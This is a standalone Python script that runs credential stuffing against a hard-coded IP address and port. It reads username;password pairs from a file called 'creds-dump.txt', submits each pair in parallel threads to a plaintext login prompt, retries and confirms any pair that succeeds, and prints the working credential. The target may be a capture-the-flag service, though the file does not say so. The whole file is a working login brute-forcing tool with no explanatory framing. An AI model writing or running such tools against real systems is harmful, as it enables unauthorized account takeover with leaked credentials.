#!/usr/bin/env python3

import argparse
import socket
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path


HOST = "3.130.120.175"
PORT = 59157
DUMP_PATH = Path("creds-dump.txt")


def recv_until(sock: socket.socket, marker: bytes) -> bytes:
    data = bytearray()
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data.extend(chunk)
    return bytes(data)


def try_login(username: str, password: str, response_timeout: float = 0.25) -> str:
    try:
        with socket.create_connection((HOST, PORT), timeout=5) as sock:
            sock.settimeout(5)
            recv_until(sock, b"Username:")
            sock.sendall(username.encode("utf-8") + b"\n")
            recv_until(sock, b"Password:")
            sock.sendall(password.encode("utf-8") + b"\n")

            data = bytearray()
            sock.settimeout(response_timeout)
            while True:
                try:
                    chunk = sock.recv(4096)
                except socket.timeout:
                    break
                if not chunk:
                    break
                data.extend(chunk)
                if b"Invalid username or password" in data:
                    break
            return bytes(data).decode("utf-8", errors="replace")
    except OSError:
        return ""


def attempt_credential(
    index: int, username: str, password: str, stop_event: threading.Event
) -> tuple[int, str, str, str] | None:
    if stop_event.is_set():
        return None

    response = ""
    for _ in range(3):
        if stop_event.is_set():
            return None
        response = try_login(username, password)
        if response.strip():
            break
        time.sleep(0.05)

    if not response.strip() or "Invalid username or password" in response:
        return None

    confirmed = try_login(username, password, response_timeout=1.0)
    if confirmed.strip() and "Invalid username or password" not in confirmed:
        stop_event.set()
        return index, username, password, confirmed

    return None


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("username", nargs="?")
    parser.add_argument("password", nargs="?")
    args = parser.parse_args()

    if args.username is not None and args.password is not None:
        response = try_login(args.username, args.password)
        print(f"LEN={len(response)}")
        print(response)
        return

    with DUMP_PATH.open("r", encoding="utf-8") as handle:
        credentials = [
            (index, *line.rstrip("\n").split(";", 1))
            for index, line in enumerate(handle, start=1)
        ]

    stop_event = threading.Event()
    checked = 0

    with ThreadPoolExecutor(max_workers=8) as executor:
        futures = [
            executor.submit(attempt_credential, index, username, password, stop_event)
            for index, username, password in credentials
        ]

        for future in as_completed(futures):
            checked += 1
            result = future.result()

            if result is not None:
                index, username, password, response = result
                print(f"SUCCESS {index} {username};{password}")
                print(response)
                return

            if checked % 100 == 0:
                print(f"checked {checked}", flush=True)

    print("No valid credential found.")


if __name__ == "__main__":
    main()
